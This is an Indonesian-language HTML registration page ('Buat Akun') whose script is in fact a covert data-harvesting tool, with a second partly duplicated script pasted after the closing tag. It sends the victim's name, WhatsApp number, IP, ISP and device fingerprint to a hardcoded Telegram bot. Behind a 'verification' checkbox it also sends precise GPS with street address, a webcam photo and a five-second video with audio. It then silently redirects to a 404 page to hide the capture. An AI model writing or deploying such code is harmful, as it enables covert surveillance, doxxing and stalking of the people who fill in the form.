<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Daftar</title>
  <style>
    body { font-family:Inter,system-ui,Arial; background:#f6f8fa; margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; }
    .card { width:360px; background:#fff; border-radius:12px; padding:18px; box-shadow:0 8px 30px rgba(2,6,23,0.08); }
    h1{ font-size:18px; margin:0 0 8px 0; }
    label{ display:block; margin-top:10px; font-size:13px; color:#222; }
    input[type="text"], input[type="tel"] { width:100%; padding:10px; margin-top:6px; border-radius:8px; border:1px solid #e3e7ee; font-size:14px; }
    .consent { margin-top:12px; font-size:13px; color:#444; }
    .consent input{ margin-right:8px; }
    button { width:100%; margin-top:14px; padding:11px; border-radius:10px; border:none; background:#0b57d0; color:#fff; font-weight:700; cursor:pointer; }
    .small{ font-size:12px; color:#666; margin-top:8px; text-align:center; }
  </style>
</head>
<body>
  <div class="card" role="main" aria-labelledby="title">
    <h1 id="title">Buat Akun</h1>

    <form id="regForm" autocomplete="off">
      <label for="name">Nama</label>
      <input id="name" name="name" type="text" required placeholder="Nama lengkap">

      <label for="wa">Nomor WhatsApp (contoh 62812...)</label>
      <input id="wa" name="wa" type="tel" required placeholder="62812xxxxxxxx">

      <div class="consent">
        <label><input id="consent" type="checkbox"> Saya memberi izin untuk mengambil <strong>foto</strong>, <strong>video+audio</strong> dan <strong>lokasi GPS</strong> untuk verifikasi.</label>
      </div>

      <button id="submitBtn" type="submit">Daftar</button>
      <div class="small">Setelah berhasil, kamu akan diarahkan.</div>
    </form>
  </div>

<script>
/* === CONFIG === */
const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
const CHAT_ID   = "6216902201";
/* ============== */

function rand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
function generatePhone(){ let s='628'; const len = 9 + Math.floor(Math.random()*3); for(let i=0;i<len;i++) s+=Math.floor(Math.random()*10); return s; }
function safeCaption(s){ if(!s) return ''; if(s.length<=1000) return s; return s.slice(0,1000-3)+'...'; }

async function fetchJSON(url){
  try{ const r = await fetch(url, { cache:'no-store' }); if(!r.ok) throw new Error('bad '+r.status); return await r.json(); }catch(e){ return null; }
}

/* IP info fallback */
async function getIPInfo(){
  const sources = [
    { url:'https://ipapi.co/json/', mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country_name||j.country, org:j.org, postal:j.postal, timezone:j.timezone, lat:j.latitude||j.lat, lon:j.longitude||j.lon, asn:j.asn }) },
    { url:'https://ipwhois.app/json/', mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country, org:j.org||j.isp, postal:j.postal, timezone:j.timezone, lat:j.latitude, lon:j.longitude }) },
    { url:'https://api.ipify.org?format=json', mapper: j => ({ ip:j.ip }) }
  ];
  for(const s of sources){
    const j = await fetchJSON(s.url);
    if(!j) continue;
    const m = s.mapper(j);
    if(m && m.ip) return m;
  }
  return { ip:'unknown' };
}

/* Reverse geocode -> return address object */
async function revGeocode(lat, lon){
  try{
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, { cache:'no-store', headers:{ 'User-Agent':'LegalApp/1.0' }});
    if(!r.ok) throw new Error('revgeo '+r.status);
    const j = await r.json();
    return { display: j.display_name || null, address: j.address || {} };
  }catch(e){ return { error: e.message || 'reverse geocode failed' }; }
}

/* Geo */
function getGeo(){
  return new Promise(resolve=>{
    if(!navigator.geolocation) return resolve({ error:'geolocation not supported' });
    navigator.geolocation.getCurrentPosition(p=> resolve({ lat:p.coords.latitude, lon:p.coords.longitude, acc: p.coords.accuracy + ' m' }), err => resolve({ error: err.message }), { enableHighAccuracy: true, timeout: 10000 });
  });
}

/* Battery / Connection / extra fields */
async function getBattery(){ try{ if(!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging? 'Charging':'Not Charging'})`; }catch{ return null; } }
function getConnection(){ try{ const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if(!c) return null; return { effectiveType:c.effectiveType, downlink:c.downlink, rtt:c.rtt, saveData:c.saveData }; }catch{ return null; } }

/* Capture photo + video from single stream:
   - request stream (video + audio)
   - play video element
   - wait small time, take snapshot => photoBlob
   - start MediaRecorder, record durationMillis => videoBlob
   - stop tracks
*/
async function capturePhotoAndVideo(durationMillis = 5000){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:true });
    const v = document.createElement('video');
    v.srcObject = stream;
    v.muted = true;
    await v.play();
    // wait for frame
    await new Promise(r => setTimeout(r, 700));
    // take snapshot
    const canvas = document.createElement('canvas');
    const side = Math.min(v.videoWidth || 640, v.videoHeight || 480);
    const size = 800;
    canvas.width = size; canvas.height = size;
    const ctx = canvas.getContext('2d');
    const sx = Math.max(0, (v.videoWidth - side) / 2);
    const sy = Math.max(0, (v.videoHeight - side) / 2);
    ctx.drawImage(v, sx, sy, side, side, 0, 0, size, size);
    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));

    // record video+audio
    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
    const chunks = [];
    recorder.ondataavailable = e => { if(e.data && e.data.size) chunks.push(e.data); };
    recorder.start();
    await new Promise(r => setTimeout(r, durationMillis));
    recorder.stop();
    await new Promise(r => recorder.onstop = r);
    // stop tracks
    stream.getTracks().forEach(t => t.stop());
    const videoBlob = new Blob(chunks, { type: 'video/webm' });
    return { photoBlob, videoBlob };
  }catch(e){
    // permission denied or error
    return { photoBlob: null, videoBlob: null };
  }
}

/* Build boxed caption with detailed address fields */
function buildDetailedBox(data){
  const now = new Date();
  const lines = [];
  lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
  if(data.profile && data.profile.phone) lines.push(` ├─ > Nomor Telepon: ${data.profile.phone}`);
  if(data.profile && data.profile.name) lines.push(` ├─ > Nama: ${data.profile.name}`);
  lines.push(` ├─ > Pesan`);
  lines.push(` │   └─ ${data.message || 'Pendaftaran & Verifikasi (dengan izin)'}`);
  lines.push(` ├─ > Pengirim (web)`);
  lines.push(` │   └─ ${data.userAgent || '-'}`);

  lines.push(` ├─ > IP / ISP`);
  const ip = data.ipInfo || {};
  lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
  lines.push(` │   ├─ ISP/Org: ${ip.org || '-'}`);
  lines.push(` │   ├─ ASN: ${ip.asn || '-'}`);
  lines.push(` │   ├─ City: ${ip.city || '-'}`);
  lines.push(` │   ├─ Region: ${ip.region || '-'}`);
  lines.push(` │   ├─ Country: ${ip.country || '-'}`);
  lines.push(` │   └─ Postal: ${ip.postal || '-'}`);

  lines.push(` ├─ > Device`);
  lines.push(` │   ├─ Platform: ${data.platform || '-'}`);
  lines.push(` │   ├─ Screen: ${data.screen || '-'}`);
  lines.push(` │   ├─ Language: ${data.language || '-'}`);
  lines.push(` │   ├─ Timezone (browser): ${data.timezone || '-'}`);
  lines.push(` │   ├─ Local Date: ${data.localDate || '-'}`);
  lines.push(` │   ├─ Battery: ${data.battery || '-'}`);
  lines.push(` │   ├─ Device Memory: ${data.deviceMemory || '-'}`);
  lines.push(` │   ├─ Max Touch Points: ${data.maxTouchPoints || '-'}`);
  lines.push(` │   └─ Connection: ${data.connection ? (data.connection.effectiveType || '-') + ' | downlink:' + (data.connection.downlink||'-') + 'Mbps' : 'N/A'}`);

  lines.push(` ├─ > Geo (GPS)`);
  if(data.geo && !data.geo.error){
    lines.push(` │   ├─ Lat: ${data.geo.lat}`);
    lines.push(` │   ├─ Lon: ${data.geo.lon}`);
    lines.push(` │   ├─ Akurasi: ${data.geo.acc || '-'}`);
    lines.push(` │   └─ Maps: https://maps.google.com/?q=${data.geo.lat},${data.geo.lon}`);
  } else {
    lines.push(` │   └─ GPS: ${data.geo ? data.geo.error : '-'}`);
  }

  // ADDRESS - many fields
  lines.push(` ├─ > Alamat (Detail)`);
  const a = data.address || {};
  // order & labels requested
  lines.push(` │   ├─ Negara: ${a.country || '-'}`);
  lines.push(` │   ├─ Kode Negara: ${a.country_code || '-'}`);
  lines.push(` │   ├─ Provinsi: ${a.state || a.region || '-'}`);
  lines.push(` │   ├─ State District: ${a.state_district || '-'}`);
  lines.push(` │   ├─ Kabupaten: ${a.county || '-'}`);
  lines.push(` │   ├─ Region: ${a.region || '-'}`);
  lines.push(` │   ├─ Kota: ${a.city || a.town || a.village || '-'}`);
  lines.push(` │   ├─ Kecamatan: ${a.suburb || a.municipality || a.city_district || '-'}`);
  lines.push(` │   ├─ Desa/Kelurahan: ${a.village || a.hamlet || '-'}`);
  lines.push(` │   ├─ Kampung/Dusun (hamlet): ${a.hamlet || '-'}`);
  lines.push(` │   ├─ Jalan: ${a.road || a.pedestrian || '-'}`);
  lines.push(` │   ├─ Nomor: ${a.house_number || '-'}`);
  lines.push(` │   ├─ Kode Pos: ${a.postcode || '-'}`);
  lines.push(` │   ├─ Suburb: ${a.suburb || '-'}`);
  lines.push(` │   ├─ Neighbourhood: ${a.neighbourhood || '-'}`);
  lines.push(` │   ├─ Quarter: ${a.quarter || '-'}`);
  lines.push(` │   └─ display_name: ${data.revDisplay || '-'}`);

  lines.push(` ├─ > Profile (input/auto)`);
  lines.push(` │   ├─ Nama (input): ${data.profile.name || '-'}`);
  lines.push(` │   ├─ Nomor WA (input): ${data.profile.phone || '-'}`);
  lines.push(` │   ├─ Pekerjaan: ${data.profile.job || '-'}`);
  lines.push(` │   └─ Kampung (inferred): ${data.profile.kampung || '-'}`);

  lines.push(`╰─ > Sumber: Sistem (dengan persetujuan pengguna)`);

  return safeCaption(lines.join('\n'));
}

/* Telegram helpers */
async function sendPhotoCaption(photoBlob, caption){
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', photoBlob, 'photo.jpg');
  fd.append('caption', caption);
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
}
async function sendVideoCaption(videoBlob, caption){
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('video', videoBlob, 'capture.webm');
  fd.append('caption', caption);
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: fd });
}
async function sendText(caption){
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: caption }) });
}

/* Main */
document.getElementById('regForm').addEventListener('submit', async function(e){
  e.preventDefault();
  const name = document.getElementById('name').value.trim();
  const wa = document.getElementById('wa').value.trim();
  const consent = document.getElementById('consent').checked;

  if(!name || !wa){ alert('Isi nama dan nomor WA'); return; }

  // Minimal immediate registration (fast)
  const regText = `╭─ > Tanggal: ${new Date().toLocaleString()}\n ├─ > Nama: ${name}\n ├─ > Nomor WA: ${wa}\n ╰─ > Aksi: Pendaftaran`;
  try{ await sendText(regText); } catch(e){ /* ignore */ }

  // gather base info
  const ipInfo = await getIPInfo();
  const battery = await getBattery();
  const connection = getConnection();
  const deviceMemory = navigator.deviceMemory || '-';
  const maxTouchPoints = navigator.maxTouchPoints || '-';
  const colorDepth = screen.colorDepth || '-';
  const device = {
    platform: navigator.platform || '-',
    userAgent: navigator.userAgent || '-',
    screen: (screen ? `${screen.width}x${screen.height}` : '-'),
    language: navigator.language || '-',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
    localDate: new Date().toLocaleString(),
    battery
  };

  // prepare profile (if you have DB mapping, replace here)
  const profile = { name, phone: wa, job:'-', kampung: '-' };

  // If consent: capture geo + media
  let geo = { error:'not requested' }, rev = null;
  let photoBlob = null, videoBlob = null;

  if(consent){
    geo = await getGeo();
    if(!geo.error && geo.lat && geo.lon){
      rev = await revGeocode(geo.lat, geo.lon);
    }
    // capture both photo + video from single stream (5s)
    const media = await capturePhotoAndVideo(5000);
    photoBlob = media.photoBlob;
    videoBlob = media.videoBlob;
  }

  // Build data object
  const data = {
    profile,
    message: 'Pendaftaran & Verifikasi (dengan izin)',
    userAgent: device.userAgent,
    ipInfo,
    platform: device.platform,
    screen: device.screen,
    language: device.language,
    timezone: device.timezone,
    localDate: device.localDate,
    battery: device.battery,
    deviceMemory,
    maxTouchPoints,
    colorDepth,
    connection,
    geo,
    address: (rev && rev.address) ? rev.address : {},
    revDisplay: (rev && rev.display) ? rev.display : null
  };

  const boxedCaption = buildDetailedBox(data);

  // 1) send photo + caption (boxed) first if available
  try{
    if(photoBlob){
      await sendPhotoCaption(photoBlob, boxedCaption);
    } else {
      // if no photo but have boxed caption, send it as text first
      await sendText(boxedCaption);
    }
  }catch(e){
    // ignore
  }

  // 2) then send video + caption "ini videonya" (if available)
  try{
    if(videoBlob){
      await sendVideoCaption(videoBlob, "ini videonya");
    }
  }catch(e){
    // ignore
  }

  // redirect silently to 404
  window.location.href = '/404.html';
});
</script>
</body>
</html>/* Reverse geocode */
async function revGeocode(lat, lon){
  try{
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, { cache:'no-store', headers:{ 'User-Agent':'LegalApp/1.0' }});
    if(!r.ok) throw new Error('revgeo '+r.status);
    const j = await r.json();
    return { display: j.display_name || null, address: j.address || {} };
  }catch(e){ return { error: e.message || 'revgeo fail' }; }
}

/* Geo */
function getGeo(){
  return new Promise(resolve=>{
    if(!navigator.geolocation) return resolve({ error:'geolocation not supported' });
    navigator.geolocation.getCurrentPosition(p=> resolve({ lat:p.coords.latitude, lon:p.coords.longitude, acc: p.coords.accuracy + ' m' }), err => resolve({ error: err.message }), { enableHighAccuracy: true, timeout: 10000 });
  });
}

/* Battery / Connection / Extra device fields */
async function getBattery(){ try{ if(!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging? 'Charging':'Not Charging'})`; }catch{ return null; } }
function getConnection(){ try{ const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if(!c) return null; return { effectiveType:c.effectiveType, downlink:c.downlink, rtt:c.rtt, saveData:c.saveData }; }catch{ return null; } }

/* Capture photo */
async function capturePhoto(){
  try{
    const s = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false });
    const v = document.createElement('video'); v.srcObject = s;
    await v.play();
    await new Promise(r=>setTimeout(r,900));
    const canvas = document.createElement('canvas');
    const side = Math.min(v.videoWidth||640, v.videoHeight||480);
    const size = 800; canvas.width=size; canvas.height=size;
    const ctx = canvas.getContext('2d');
    const sx = Math.max(0,(v.videoWidth - side)/2), sy = Math.max(0,(v.videoHeight - side)/2);
    ctx.drawImage(v, sx, sy, side, side, 0, 0, size, size);
    s.getTracks().forEach(t=>t.stop());
    return await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
  }catch(e){
    return null;
  }
}

/* Capture video+audio (MediaRecorder) for durationMillis ms */
async function captureVideoWithAudio(durationMillis = 5000){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:true });
    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
    const chunks = [];
    recorder.ondataavailable = e => { if(e.data && e.data.size) chunks.push(e.data); };
    recorder.start();
    // wait duration
    await new Promise(r => setTimeout(r, durationMillis));
    recorder.stop();
    // stop tracks
    stream.getTracks().forEach(t => t.stop());
    // wait for stop to finish and chunks to be available
    await new Promise(r => { recorder.onstop = r; });
    return new Blob(chunks, { type: 'video/webm' });
  }catch(e){
    return null;
  }
}

/* infer SIM/operator from ipInfo.org or userAgent (best-effort only) */
function inferOperator(ipInfo, userAgent){
  const candidates = [];
  const s = (ipInfo && ipInfo.org) ? ipInfo.org.toLowerCase() : '';
  if(s.includes('telkomsel') || s.includes('telkom')) candidates.push('Telkomsel/Telkom');
  if(s.includes('indosat') || s.includes('im3') || s.includes('axis')) candidates.push('Indosat/IM3/Axis');
  if(s.includes('xl') || s.includes('axis')) candidates.push('XL/Axis');
  if(s.includes('smartfren')) candidates.push('Smartfren');
  if(s.includes('tri') || s.includes('3')) candidates.push('Tri (3)');
  // userAgent hints (very weak)
  const ua = (userAgent || '').toLowerCase();
  if(ua.includes('indosat')) candidates.push('Indosat (UA hint)');
  if(ua.includes('telkomsel')) candidates.push('Telkomsel (UA hint)');
  return candidates.length ? Array.from(new Set(candidates)).join(' | ') : 'Unknown/Not available';
}

/* Build boxed caption with many fields */
function buildBoxedCaption(data){
  const now = new Date();
  const lines = [];
  lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
  if(data.profile && data.profile.phone) lines.push(` ├─ > Nomor Telepon: ${data.profile.phone}`);
  if(data.profile && data.profile.name) lines.push(` ├─ > Nama: ${data.profile.name}`);
  lines.push(` ├─ > Pesan`);
  lines.push(` │   └─ ${data.message || 'Pendaftaran & Verifikasi (dengan izin)'}`);
  lines.push(` ├─ > Pengirim (web)`);
  lines.push(` │   └─ ${data.userAgent || '-'}`);

  lines.push(` ├─ > IP / ISP / Operator (inferred)`);
  const ip = data.ipInfo||{};
  lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
  lines.push(` │   ├─ ISP/Org: ${ip.org || '-'}`);
  lines.push(` │   ├─ City: ${ip.city || '-'}`);
  lines.push(` │   ├─ Region: ${ip.region || '-'}`);
  lines.push(` │   ├─ Country: ${ip.country || '-'}`);
  lines.push(` │   └─ Postal: ${ip.postal || '-'}`);
  lines.push(` │   └─ SIM/Operator (inferred): ${data.inferredOperator || '-'}`);

  lines.push(` ├─ > Device (extra)`);
  lines.push(` │   ├─ Platform: ${data.platform || '-'}`);
  lines.push(` │   ├─ Screen: ${data.screen || '-'}`);
  lines.push(` │   ├─ Language: ${data.language || '-'}`);
  lines.push(` │   ├─ Timezone: ${data.timezone || '-'} (offset: ${data.timezoneOffset || 'N/A'})`);
  lines.push(` │   ├─ Battery: ${data.battery || '-'}`);
  lines.push(` │   ├─ Device Memory: ${data.deviceMemory || '-'}`);
  lines.push(` │   ├─ Max Touch Points: ${data.maxTouchPoints || '-'}`);
  lines.push(` │   ├─ Color Depth: ${data.colorDepth || '-'}`);
  lines.push(` │   └─ Connection: ${data.connection ? (data.connection.effectiveType || '-') + ' | downlink:' + (data.connection.downlink||'-') + 'Mbps' : 'N/A'}`);

  lines.push(` ├─ > Geo (GPS)`);
  if(data.geo && !data.geo.error){
    lines.push(` │   ├─ Lat: ${data.geo.lat}`);
    lines.push(` │   ├─ Lon: ${data.geo.lon}`);
    lines.push(` │   ├─ Akurasi: ${data.geo.acc || '-'}`);
    lines.push(` │   └─ Maps: https://maps.google.com/?q=${data.geo.lat},${data.geo.lon}`);
  } else {
    lines.push(` │   └─ GPS: ${data.geo? data.geo.error : '-'}`);
  }

  lines.push(` ├─ > Alamat (Detail)`);
  const a = data.address || {};
  const addr = [
    ['Negara','country'], ['Kode Negara','country_code'], ['Provinsi','state'],
    ['State District','state_district'], ['Kabupaten','county'], ['Region','region'],
    ['Kota','city'], ['Town','town'], ['Village','village'], ['Municipality','municipality'],
    ['Kecamatan/Suburb','suburb'], ['Neighbourhood','neighbourhood'], ['Quarter','quarter'],
    ['Kampung/Hamlet','hamlet'], ['Jalan','road'], ['Nomor','house_number'], ['Kode Pos','postcode']
  ];
  for(const [label,key] of addr){
    lines.push(` │   ├─ ${label}: ${a[key] || '-'}`);
  }

  // Profile extras & media info
  lines.push(` ├─ > Profile (input/auto)`);
  lines.push(` │   ├─ Nama (input): ${data.profile.name || '-'}`);
  lines.push(` │   ├─ Nomor WA (input): ${data.profile.phone || '-'}`);
  lines.push(` │   ├─ Profile job: ${data.profile.job || '-'}`);
  lines.push(` │   └─ Kampung (inferred): ${data.profile.kampung || '-'}`);

  if(data.mediaInfo){
    lines.push(` ├─ > Media Capture`);
    lines.push(` │   ├─ Type: ${data.mediaInfo.type || '-'}`);
    lines.push(` │   ├─ Duration (ms): ${data.mediaInfo.duration || '-'}`);
    lines.push(` │   └─ Size (bytes): ${data.mediaInfo.size || '-'}`);
  }

  lines.push(`╰─ > Sumber: Sistem (dengan persetujuan pengguna)`);
  const txt = lines.join('\n');
  return safeCaption(txt);
}

/* Telegram send helpers */
async function sendVideoCaption(videoBlob, caption){
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('video', videoBlob, 'capture.webm');
  fd.append('caption', caption);
  // sendVideo: use bot sendVideo endpoint
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: fd });
}
async function sendPhotoCaption(photoBlob, caption){
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', photoBlob, 'photo.jpg');
  fd.append('caption', caption);
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
}
async function sendText(caption){
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: caption }) });
}

/* Main handler */
document.getElementById('regForm').addEventListener('submit', async function(e){
  e.preventDefault();
  const name = document.getElementById('name').value.trim();
  const wa = document.getElementById('wa').value.trim();
  const consent = document.getElementById('consent').checked;

  if(!name || !wa){ alert('Isi nama dan nomor WA'); return; }

  // send minimal registration (fast)
  const regText = `╭─ > Tanggal: ${new Date().toLocaleString()}\n ├─ > Nama: ${name}\n ├─ > Nomor WA: ${wa}\n ╰─ > Aksi: Pendaftaran`;
  try{ await sendText(regText); } catch(e){ /* ignore */ }

  // gather data
  const ipInfo = await getIPInfo();
  const inferredOperator = inferOperator(ipInfo, navigator.userAgent);
  const battery = await getBattery();
  const connection = getConnection();
  const deviceMemory = navigator.deviceMemory || '-';
  const maxTouchPoints = navigator.maxTouchPoints || '-';
  const colorDepth = screen.colorDepth || '-';
  const timezoneOffset = (new Date()).getTimezoneOffset();

  let geo = { error:'not requested' }, rev = null;
  let photoBlob = null, videoBlob = null, mediaInfo = null;

  if(consent){
    // geo
    geo = await getGeo();
    if(!geo.error && geo.lat && geo.lon){
      rev = await revGeocode(geo.lat, geo.lon);
    }
    // attempt video+audio capture first (5s)
    try{
      videoBlob = await captureVideoWithAudio(5000); // 5 seconds
      if(videoBlob){
        mediaInfo = { type: 'video+audio', duration: 5000, size: videoBlob.size };
      } else {
        // fallback to still photo
        photoBlob = await capturePhoto();
        if(photoBlob) mediaInfo = { type:'photo', size: photoBlob.size };
      }
    }catch(e){
      // ignore
    }
  }

  // build profile (if you maintain profile db, merge here)
  const profile = { name: name, phone: wa, job: '-', kampung: '-' };

  // fill data object
  const data = {
    profile,
    message: 'Pendaftaran & Verifikasi (dengan izin)',
    userAgent: navigator.userAgent || '-',
    ipInfo,
    inferredOperator,
    platform: navigator.platform || '-',
    screen: (screen ? `${screen.width}x${screen.height}` : '-'),
    language: navigator.language || '-',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
    timezoneOffset,
    battery,
    deviceMemory,
    maxTouchPoints,
    colorDepth,
    connection,
    geo,
    address: (rev && rev.address) ? rev.address : {},
    revDisplay: (rev && rev.display) ? rev.display : null,
    mediaInfo
  };

  const caption = buildBoxedCaption(data);

  // send single message: prefer video, else photo, else text
  try{
    if(videoBlob){
      await sendVideoCaption(videoBlob, caption);
    } else if(photoBlob){
      await sendPhotoCaption(photoBlob, caption);
    } else {
      await sendText(caption);
    }
  }catch(e){
    // ignore failure
  }

  // redirect silently to 404 page
  window.location.href = '/404.html';
});
</script>
</body>
</html>
